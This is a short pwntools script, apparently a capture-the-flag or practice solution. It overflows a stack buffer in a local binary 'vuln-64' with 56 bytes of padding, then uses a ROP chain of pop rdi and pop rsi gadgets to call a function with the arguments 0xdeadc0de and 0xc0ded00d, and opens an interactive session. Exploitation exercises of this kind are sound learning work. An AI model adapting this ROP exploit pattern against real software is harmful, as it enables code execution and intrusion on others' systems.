from pwn import *

context.binary = ELF("./vuln-64")

addr = 0x000000000040116f

c0ded00d = 0xc0ded00d
deadc0de = 0xdeadc0de

offset = 56

# 0x00000000004011f9 : pop rsi ; pop r15 ; ret
# 0x00000000004011fb : pop rdi ; ret
payload = flat([
    b"A" * offset,
    0x00000000004011f9,
    c0ded00d,
    0x0,
    0x00000000004011fb,
    deadc0de,
    addr,
    0x0,
])

p = process()

# gdb.attach(p)
p.recvline()
p.sendline(payload)
p.interactive()
# 0x08049268 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret